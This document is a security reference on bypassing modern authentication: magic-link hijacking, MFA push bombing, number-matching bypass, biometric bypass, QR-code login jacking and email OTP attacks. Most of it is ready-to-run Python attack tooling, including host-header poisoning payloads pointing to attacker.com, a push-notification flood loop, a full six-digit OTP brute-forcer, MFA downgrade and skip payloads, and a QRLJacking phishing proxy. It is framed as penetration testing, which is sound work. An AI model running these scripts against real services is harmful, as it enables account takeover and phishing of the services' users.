# Modern Authentication Bypass Techniques

## Overview

Modern passwordless authentication methods introduce new attack surfaces. This document covers magic link hijacking, passwordless auth flaws, biometric bypass, push notification fatigue (MFA bombing), number matching bypass, and QR code authentication attacks. Includes real-world cases from 2024-2025.

**Key Sources**:
- https://netrixglobal.com/blog/cybersecurity/navigating-the-new-wave-of-mfa-bypass-attacks-in-2025/
- https://www.prophetsecurity.ai/blog/what-is-mfa-fatigue-attack-mfa-bombing-best-practices
- https://abnormal.ai/glossary/mfa-bypass
- https://security.uchicago.edu/2024/10/01/mfa-fatigue-attacks/

---

## 1. Magic Link Hijacking

### 1.1 Attack Vectors

**Vulnerability**: Magic links transmit authentication tokens via email, creating multiple interception points.

**Attack Scenarios**:
```
1. Email Interception
   - MITM on unencrypted email (SMTP without TLS)
   - Compromised email account
   - Email forwarding rules
   - Shared/compromised email server

2. Referrer Header Leakage
   - Magic link page loads external resources
   - Token leaked via Referer header to third parties
   - CDN/analytics scripts receive the token

3. Token in URL
   - Browser history contains token
   - URL shared inadvertently (screenshots, screen sharing)
   - Server access logs contain token
   - Proxy/CDN logs contain token

4. Open Redirect Chain
   - Magic link -> open redirect -> attacker captures token
   - Host header injection in magic link generation

5. Race Condition
   - Multiple uses of same magic link before invalidation
   - Parallel requests with same token
```

### 1.2 Magic Link Exploitation Script

```python
#!/usr/bin/env python3
"""Magic Link Authentication Attack Framework"""

import requests
import time
import hashlib
import threading
from urllib.parse import urlparse, parse_qs

class MagicLinkAttacker:
    """Comprehensive magic link authentication testing."""

    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def test_token_predictability(self, email, count=20):
        """Request multiple magic links and analyze token patterns."""
        tokens = []
        for i in range(count):
            resp = self.session.post(
                f"{self.target_url}/auth/magic-link",
                json={'email': email}
            )
            # Token may be in response (debug mode) or email
            if resp.status_code == 200:
                data = resp.json()
                if 'token' in data:
                    tokens.append({
                        'token': data['token'],
                        'timestamp': time.time(),
                        'index': i
                    })
            time.sleep(0.5)

        # Analyze patterns
        analysis = self._analyze_tokens(tokens)
        return analysis

    def test_token_reuse(self, magic_link_url):
        """Test if magic link token can be used multiple times."""
        results = []
        for i in range(5):
            resp = self.session.get(magic_link_url, allow_redirects=False)
            results.append({
                'attempt': i + 1,
                'status': resp.status_code,
                'authenticated': resp.status_code in [200, 302],
                'session_cookie': resp.cookies.get('session', None)
            })
            time.sleep(0.5)

        reusable = sum(1 for r in results if r['authenticated'])
        return {
            'reusable': reusable > 1,
            'uses_allowed': reusable,
            'vulnerability': 'Token reuse allows account takeover via captured links'
                            if reusable > 1 else None,
            'results': results
        }

    def test_token_race_condition(self, magic_link_url, threads=10):
        """Test race condition in magic link consumption."""
        results = []
        barrier = threading.Barrier(threads)

        def consume_token(thread_id):
            barrier.wait()  # Synchronize all threads
            resp = requests.get(magic_link_url, allow_redirects=False)
            results.append({
                'thread': thread_id,
                'status': resp.status_code,
                'authenticated': resp.status_code in [200, 302],
            })

        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=consume_token, args=(i,))
            thread_list.append(t)
            t.start()

        for t in thread_list:
            t.join()

        authenticated_count = sum(1 for r in results if r['authenticated'])
        return {
            'race_condition': authenticated_count > 1,
            'concurrent_auths': authenticated_count,
            'results': results
        }

    def test_host_header_poisoning(self, email):
        """Test host header injection in magic link generation."""
        payloads = [
            {'Host': 'attacker.com'},
            {'Host': 'target.com\r\nX-Injected: attacker.com'},
            {'Host': 'attacker.com', 'X-Forwarded-Host': 'attacker.com'},
            {'X-Forwarded-Host': 'attacker.com'},
            {'X-Original-URL': 'https://attacker.com/auth/verify'},
            {'X-Rewrite-URL': 'https://attacker.com/auth/verify'},
        ]

        results = []
        for headers in payloads:
            resp = requests.post(
                f"{self.target_url}/auth/magic-link",
                json={'email': email},
                headers=headers
            )
            results.append({
                'headers': headers,
                'status': resp.status_code,
                'response': resp.text[:200],
            })

        return results

    def test_referrer_leakage(self, magic_link_url):
        """Check if magic link page leaks token via Referrer header."""
        # Load the magic link page
        resp = self.session.get(magic_link_url)

        # Check for external resources that would receive Referer
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(resp.text, 'html.parser')

        external_resources = []
        for tag in soup.find_all(['script', 'img', 'link', 'iframe']):
            src = tag.get('src') or tag.get('href')
            if src and src.startswith('http') and urlparse(self.target_url).netloc not in src:
                external_resources.append({
                    'tag': tag.name,
                    'url': src,
                    'receives_referer': True
                })

        return {
            'external_resources': external_resources,
            'token_leaked': len(external_resources) > 0,
            'referrer_policy': resp.headers.get('Referrer-Policy', 'not set')
        }

    def test_token_expiration(self, magic_link_url, check_intervals=[60, 300, 600, 1800, 3600]):
        """Test magic link token expiration timing."""
        results = []
        for wait_seconds in check_intervals:
            time.sleep(wait_seconds)
            resp = self.session.get(magic_link_url, allow_redirects=False)
            results.append({
                'waited_seconds': wait_seconds,
                'still_valid': resp.status_code in [200, 302],
            })
            if resp.status_code not in [200, 302]:
                break  # Token expired

        return results

    def _analyze_tokens(self, tokens):
        """Analyze token predictability."""
        if len(tokens) < 2:
            return {'insufficient_data': True}

        token_values = [t['token'] for t in tokens]
        unique = len(set(token_values))

        analysis = {
            'total': len(tokens),
            'unique': unique,
            'duplicates': len(tokens) - unique,
            'lengths': list(set(len(t) for t in token_values)),
            'patterns': []
        }

        # Check for sequential patterns
        for i in range(len(token_values) - 1):
            try:
                val1 = int(token_values[i], 16)
                val2 = int(token_values[i + 1], 16)
                if abs(val2 - val1) < 1000:
                    analysis['patterns'].append('SEQUENTIAL')
                    break
            except:
                pass

        # Check for timestamp-based tokens
        for token_data in tokens:
            ts = str(int(token_data['timestamp']))
            if ts in token_data['token']:
                analysis['patterns'].append('TIMESTAMP_BASED')
                break

        return analysis
```

---

## 2. Push Notification Fatigue (MFA Bombing)

### 2.1 Attack Methodology

**Vulnerability**: MFA push notification systems can be exploited by flooding users with authentication requests until they approve one out of frustration.

**Source**: Cisco Talos reported that in Q1 2024, 50% of incident responses involved MFA bypass attacks.

**Attack Flow**:
```
1. Attacker obtains victim's username and password (phishing, breach, credential stuffing)
2. Attacker initiates login, triggering push notification to victim's phone
3. Victim denies the request
4. Attacker immediately re-initiates login (new push)
5. Repeat rapidly, sending dozens of notifications
6. Victim eventually approves out of frustration, confusion, or to stop the spam
7. Attacker gains access
```

**Automation Script**:
```python
#!/usr/bin/env python3
"""MFA Fatigue/Bombing Testing Framework"""

import requests
import time
import threading

class MFAFatigueTester:
    """Test application resistance to MFA fatigue attacks."""

    def __init__(self, target_url):
        self.target_url = target_url

    def test_push_flood_protection(self, username, password, max_attempts=50):
        """Test if application limits push notification frequency."""
        results = []

        for i in range(max_attempts):
            resp = requests.post(
                f"{self.target_url}/api/login",
                json={'username': username, 'password': password}
            )

            result = {
                'attempt': i + 1,
                'status': resp.status_code,
                'mfa_prompted': resp.status_code == 200 and 'mfa' in resp.text.lower(),
                'blocked': resp.status_code in [429, 403],
                'timestamp': time.time()
            }

            if result['blocked']:
                result['block_message'] = resp.text[:200]
                results.append(result)
                break

            results.append(result)
            time.sleep(1)  # 1 second between attempts

        # Analysis
        total_prompts = sum(1 for r in results if r['mfa_prompted'])
        blocked_at = next((r['attempt'] for r in results if r['blocked']), None)

        return {
            'total_attempts': len(results),
            'push_notifications_sent': total_prompts,
            'blocked_after': blocked_at,
            'vulnerable_to_fatigue': blocked_at is None or blocked_at > 10,
            'recommendations': [
                'Implement rate limiting on MFA push notifications',
                'Add cooldown period between push attempts',
                'Require number matching instead of simple approve/deny',
                'Lock account after N failed MFA attempts',
                'Alert user via secondary channel about repeated attempts',
            ],
            'results': results
        }

    def test_number_matching_bypass(self, username, password):
        """Test if number matching can be bypassed or predicted."""
        # Step 1: Initiate login
        resp = requests.post(
            f"{self.target_url}/api/login",
            json={'username': username, 'password': password}
        )

        if resp.status_code == 200:
            data = resp.json()
            mfa_type = data.get('mfa_type')
            challenge = data.get('challenge')

            # Check if number matching is used
            if mfa_type == 'push_with_number':
                # Test if the number is in the response
                if 'number' in data or 'code' in data:
                    return {
                        'vulnerability': 'Number matching value leaked in response',
                        'number': data.get('number') or data.get('code'),
                        'severity': 'CRITICAL'
                    }

                # Test if number is predictable (sequential, timestamp-based)
                numbers = []
                for _ in range(10):
                    resp = requests.post(
                        f"{self.target_url}/api/login",
                        json={'username': username, 'password': password}
                    )
                    if resp.ok:
                        numbers.append(resp.json().get('challenge_hint'))
                    time.sleep(2)

                return {
                    'mfa_type': mfa_type,
                    'number_matching_present': True,
                    'predictable': len(set(numbers)) < len(numbers),
                    'numbers_collected': numbers
                }

        return {'mfa_type': 'unknown', 'number_matching_present': False}

    def test_mfa_downgrade(self, username, password):
        """Test if MFA can be downgraded from push to weaker methods."""
        downgrade_params = [
            {'mfa_method': 'sms'},
            {'mfa_method': 'email'},
            {'mfa_method': 'voice'},
            {'mfa_method': 'backup_code'},
            {'prefer_method': 'otp'},
            {'authenticator_type': 'totp'},
            {'fallback': 'true'},
            {'skip_push': 'true'},
        ]

        results = []
        for params in downgrade_params:
            resp = requests.post(
                f"{self.target_url}/api/login",
                json={'username': username, 'password': password, **params}
            )
            results.append({
                'params': params,
                'status': resp.status_code,
                'downgraded': resp.status_code == 200 and 'push' not in resp.text.lower(),
                'response': resp.text[:200]
            })

        return results
```

### 2.2 Real-World MFA Bombing Cases

| Organization | Year | Technique | Impact |
|-------------|------|-----------|--------|
| Uber | 2022 | MFA fatigue via Lapsus$ | Full infrastructure compromise |
| Cisco | 2022 | Push spam + voice phishing | Internal network access |
| Microsoft | 2024 | Midnight Blizzard - token theft | Email system compromise |
| MGM Resorts | 2023 | Social engineering + MFA bypass | $100M+ in losses |

---

## 3. Biometric Authentication Bypass

### 3.1 Fingerprint Bypass Techniques

```python
class BiometricBypass:
    """Test biometric authentication bypass vectors."""

    @staticmethod
    def fingerprint_bypass_methods():
        return {
            'api_bypass': {
                'description': 'Bypass fingerprint check at API level',
                'test': 'Submit authentication request without biometric proof',
                'payloads': [
                    {'biometric_verified': True},
                    {'fingerprint_match': 1},
                    {'auth_level': 'biometric'},
                    {'skip_biometric': True},
                ],
                'severity': 'CRITICAL'
            },
            'fallback_exploitation': {
                'description': 'Exploit fallback from biometric to PIN/password',
                'test': 'Trigger biometric failure to access fallback',
                'methods': [
                    'Fail biometric 3 times to trigger PIN fallback',
                    'Send device_supports_biometric=false',
                    'Use older API version without biometric support',
                ],
                'severity': 'HIGH'
            },
            'replay_attack': {
                'description': 'Replay previously captured biometric token',
                'test': 'Capture and replay biometric session token',
                'note': 'If biometric produces a token, test if token can be replayed',
                'severity': 'HIGH'
            },
            'race_condition': {
                'description': 'Race condition between biometric check and action',
                'test': 'Submit action before biometric verification completes',
                'severity': 'MEDIUM'
            }
        }

    @staticmethod
    def face_recognition_bypass():
        return {
            'presentation_attacks': [
                'Photo of victim displayed on screen',
                'Video of victim displayed on device',
                '3D printed mask (advanced)',
                'Deepfake video in real-time',
            ],
            'api_level_attacks': [
                'Inject pre-recorded face data',
                'Bypass liveness detection parameters',
                'Manipulate confidence threshold',
                'Skip face verification step entirely',
            ],
            'testing_approach': [
                '1. Identify if liveness detection is present',
                '2. Test API without biometric payload',
                '3. Test with static image data',
                '4. Test confidence score manipulation',
                '5. Test fallback mechanisms',
            ]
        }
```

---

## 4. QR Code Authentication Attacks

### 4.1 QR Code Login Hijacking

**Vulnerability**: QR code-based authentication (used by WhatsApp Web, Telegram, Discord, etc.) can be exploited through QR code phishing and session hijacking.

```python
#!/usr/bin/env python3
"""QR Code Authentication Attack Framework"""

import requests
import time
import json
import qrcode

class QRCodeAuthAttacker:
    """Exploit QR code-based authentication systems."""

    def __init__(self, target_url):
        self.target_url = target_url

    def test_qr_code_fixation(self):
        """Test if QR code session can be fixed/reused."""
        # Get QR code session
        resp = requests.get(f"{self.target_url}/auth/qr/generate")
        qr_data = resp.json()

        qr_session_id = qr_data.get('session_id')
        qr_content = qr_data.get('qr_data')

        # Test if same QR code can be used multiple times
        results = []
        for i in range(5):
            check = requests.get(
                f"{self.target_url}/auth/qr/status",
                params={'session_id': qr_session_id}
            )
            results.append({
                'check': i + 1,
                'status': check.json().get('status'),
                'valid': check.status_code == 200
            })
            time.sleep(2)

        return {
            'qr_session_id': qr_session_id,
            'reusable': all(r['valid'] for r in results),
            'results': results
        }

    def test_qr_phishing_proxy(self):
        """
        Test QR code phishing: attacker generates legitimate QR code
        and presents it to victim via phishing page.
        """
        # Step 1: Attacker initiates QR login session
        resp = requests.get(f"{self.target_url}/auth/qr/generate")
        qr_data = resp.json()

        # Step 2: Generate QR code image to display to victim
        qr = qrcode.make(qr_data.get('qr_data'))
        qr.save('/tmp/phishing_qr.png')

        # Step 3: Poll for authentication (victim scans the QR)
        return {
            'qr_session_id': qr_data.get('session_id'),
            'qr_image': '/tmp/phishing_qr.png',
            'attack_flow': [
                '1. Attacker gets fresh QR code from target',
                '2. Attacker displays QR on phishing page',
                '3. Victim scans QR code with mobile app',
                '4. Victim authenticates the QR session',
                '5. Attacker now has authenticated session',
            ],
            'polling_endpoint': f"{self.target_url}/auth/qr/status?session_id={qr_data.get('session_id')}"
        }

    def test_qr_code_replay(self, captured_qr_data):
        """Test if captured QR code data can be replayed."""
        # Attempt to use old QR code data for new session
        resp = requests.post(
            f"{self.target_url}/auth/qr/authenticate",
            json={'qr_data': captured_qr_data}
        )
        return {
            'replay_successful': resp.status_code == 200,
            'response': resp.text[:200]
        }

    def test_qr_session_timeout(self, session_id, max_wait=600):
        """Test QR session timeout enforcement."""
        start = time.time()
        while time.time() - start < max_wait:
            resp = requests.get(
                f"{self.target_url}/auth/qr/status",
                params={'session_id': session_id}
            )
            if resp.json().get('status') == 'expired':
                return {
                    'timeout_enforced': True,
                    'timeout_seconds': int(time.time() - start)
                }
            time.sleep(10)

        return {
            'timeout_enforced': False,
            'waited_seconds': max_wait,
            'vulnerability': 'QR code session does not expire'
        }
```

### 4.2 QRLJacking (QR Code Login Jacking)

**Attack Flow**:
```
1. Attacker creates phishing page mimicking target login
2. Attacker's server requests fresh QR code from target
3. QR code displayed on phishing page to victim
4. Victim scans QR code with their mobile app (thinks it is legit)
5. Victim's app authenticates the QR session
6. Attacker's browser now has the authenticated session
7. Attacker has full access to victim's account

Key requirement: QR code must be fresh and frequently refreshed
on the phishing page to remain valid.
```

---

## 5. Passwordless Authentication Flaws

### 5.1 Email OTP Attacks

```python
class EmailOTPAttacker:
    """Test email-based OTP authentication security."""

    def test_otp_brute_force(self, target_url, email, session_id):
        """Brute force email OTP (typically 6 digits)."""
        for otp in range(0, 1000000):
            resp = requests.post(
                f"{target_url}/auth/verify-otp",
                json={
                    'email': email,
                    'otp': str(otp).zfill(6),
                    'session_id': session_id
                }
            )
            if resp.status_code == 200:
                return {'otp_found': str(otp).zfill(6), 'attempts': otp + 1}
            if resp.status_code == 429:
                return {'rate_limited_at': otp + 1}

    def test_otp_leakage(self, target_url, email):
        """Check if OTP is leaked in response."""
        resp = requests.post(
            f"{target_url}/auth/send-otp",
            json={'email': email}
        )

        # Check response body
        data = resp.json() if resp.ok else {}
        leakage_indicators = ['otp', 'code', 'token', 'verification_code']
        leaks = {k: v for k, v in data.items() if k.lower() in leakage_indicators}

        # Check response headers
        for header, value in resp.headers.items():
            if any(ind in header.lower() for ind in leakage_indicators):
                leaks[f'header:{header}'] = value

        return {
            'otp_leaked': bool(leaks),
            'leaked_data': leaks,
            'severity': 'CRITICAL' if leaks else 'NONE'
        }

    def test_otp_reuse(self, target_url, email, otp, session_id):
        """Test if OTP can be reused after successful verification."""
        # First use
        resp1 = requests.post(
            f"{target_url}/auth/verify-otp",
            json={'email': email, 'otp': otp, 'session_id': session_id}
        )

        # Second use
        resp2 = requests.post(
            f"{target_url}/auth/verify-otp",
            json={'email': email, 'otp': otp, 'session_id': session_id}
        )

        return {
            'first_use': resp1.status_code,
            'second_use': resp2.status_code,
            'reusable': resp2.status_code == 200,
            'vulnerability': 'OTP reuse allows session hijacking' if resp2.status_code == 200 else None
        }
```

---

## 6. Number Matching Bypass Techniques

### 6.1 Bypass Strategies

**Vulnerability**: Number matching (requiring users to enter a displayed number in their authenticator app) can be bypassed through several techniques.

```python
class NumberMatchingBypass:
    """Test number matching MFA bypass techniques."""

    def test_number_in_response(self, target_url, username, password):
        """Check if the matching number is leaked in the API response."""
        resp = requests.post(
            f"{target_url}/api/login",
            json={'username': username, 'password': password}
        )
        data = resp.json() if resp.ok else {}

        # Check for number in various response fields
        number_fields = ['number', 'code', 'challenge', 'match_number',
                        'verification_number', 'display_number']
        for field in number_fields:
            if field in data:
                return {
                    'number_leaked': True,
                    'field': field,
                    'value': data[field],
                    'severity': 'CRITICAL'
                }

        # Check response headers
        for header, value in resp.headers.items():
            if value.isdigit() and 1 <= int(value) <= 99:
                return {
                    'number_leaked': True,
                    'header': header,
                    'value': value,
                    'severity': 'CRITICAL'
                }

        return {'number_leaked': False}

    def test_brute_force_number(self, target_url, session_id):
        """Brute force 2-digit number matching (only 10-99 range)."""
        for number in range(10, 100):
            resp = requests.post(
                f"{target_url}/api/mfa/verify",
                json={'session_id': session_id, 'number': number}
            )
            if resp.status_code == 200:
                return {'number': number, 'attempts': number - 9}

        return {'brute_force_blocked': True}

    def test_skip_number_matching(self, target_url, session_id):
        """Test if number matching step can be skipped entirely."""
        # Try to complete auth without providing the number
        skip_payloads = [
            {'session_id': session_id, 'skip_number': True},
            {'session_id': session_id, 'number': 0},
            {'session_id': session_id, 'number': None},
            {'session_id': session_id},  # No number field at all
            {'session_id': session_id, 'mfa_method': 'push'},
        ]

        results = []
        for payload in skip_payloads:
            resp = requests.post(f"{target_url}/api/mfa/verify", json=payload)
            results.append({
                'payload': payload,
                'status': resp.status_code,
                'skipped': resp.status_code == 200
            })

        return results
```

---

## 7. Testing Checklist

```
# Magic Link Testing
[ ] Token predictability analysis
[ ] Token reuse testing
[ ] Token race condition testing
[ ] Host header poisoning in link generation
[ ] Referrer header leakage
[ ] Token expiration testing
[ ] Email interception vectors
[ ] Open redirect chaining with magic links

# MFA Fatigue Testing
[ ] Push notification flood resistance
[ ] Rate limiting on push attempts
[ ] Account lockout after repeated failures
[ ] Number matching presence and enforcement
[ ] Number matching value leakage
[ ] MFA method downgrade
[ ] Concurrent session handling during MFA

# Biometric Bypass
[ ] API-level biometric bypass
[ ] Fallback mechanism exploitation
[ ] Biometric token replay
[ ] Liveness detection bypass

# QR Code Auth Testing
[ ] QR session fixation
[ ] QR phishing proxy (QRLJacking)
[ ] QR code replay
[ ] QR session timeout enforcement
[ ] QR concurrent session handling

# Passwordless Auth Testing
[ ] OTP brute force resistance
[ ] OTP leakage in responses
[ ] OTP reuse testing
[ ] OTP expiration testing
[ ] Number matching bypass
```

---

## References

- MFA Bypass Attacks 2025: https://netrixglobal.com/blog/cybersecurity/navigating-the-new-wave-of-mfa-bypass-attacks-in-2025/
- MFA Fatigue Attacks: https://www.prophetsecurity.ai/blog/what-is-mfa-fatigue-attack-mfa-bombing-best-practices
- MFA Bypass Overview: https://abnormal.ai/glossary/mfa-bypass
- Modern MFA Bypass (SANS SEC660): https://www.sans.org/webcasts/modern-multi-factor-authentication-bypass-techniques-a-taste-of-sans-sec660
- MITRE ATT&CK MFA Interception (T1111): https://attack.mitre.org/techniques/T1111/
- MITRE ATT&CK MFA Request Generation (T1621): https://attack.mitre.org/techniques/T1621/
- QRLJacking: https://owasp.org/www-community/attacks/Qrljacking
